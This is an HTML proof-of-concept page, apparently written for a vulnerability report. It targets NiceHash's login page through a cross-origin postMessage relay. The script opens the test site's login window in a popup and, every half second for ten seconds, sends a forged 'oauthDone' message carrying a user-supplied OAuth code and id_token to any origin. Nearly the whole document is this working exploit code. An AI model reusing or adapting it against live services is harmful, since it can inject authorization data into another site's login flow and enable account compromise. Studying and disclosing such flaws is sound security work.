<!DOCTYPE html>
  <html>
  <body>
  <h3>NiceHash postMessage Relay PoC</h3>
  <textarea id="code" rows="3" cols="60" placeholder="Paste fresh code here"></textarea><br>
  <textarea id="token" rows="5" cols="60" placeholder="Paste fresh id_token here"></textarea><br>
  <button onclick="run()">Run PoC</button>
  <pre id="log"></pre>

  <script>
  function run() {
    const code  = document.getElementById('code').value.trim();
    const token = document.getElementById('token').value.trim();
    if (!code || !token) { log('[-] Paste the code and token first'); return; }

    log('[+] Opening NiceHash login from origin: ' + location.origin);
    const w = window.open('https://test.nicehash.com/my/login', '_blank',
      'width=700,height=800,left=200,top=50');

    if (!w) { log('[-] Popup blocked! Allow popups for this page.'); return; }

    // Keep sending until the Vue component mounts and listener registers
    let sent = false;
    const interval = setInterval(() => {
      try {
        w.postMessage(JSON.stringify({
          method: 'oauthDone',
          data: {
            authorization: { code, id_token: token, state: 'login' }
          }
        }), '*');

        if (!sent) {
          log('[+] postMessage sent from ' + location.origin + ' → NiceHash');
          log('[+] Watch NiceHash window → DevTools → Network → apple-callback');
          sent = true;
        }
      } catch(e) { log('[-] Error: ' + e.message); }
    }, 500);

    setTimeout(() => {
      clearInterval(interval);
      log('[+] Done sending. Check the NiceHash window network tab.');
    }, 10000);
  }

  function log(m) { document.getElementById('log').textContent += m + '\n'; }
  </script>
  </body>
  </html>
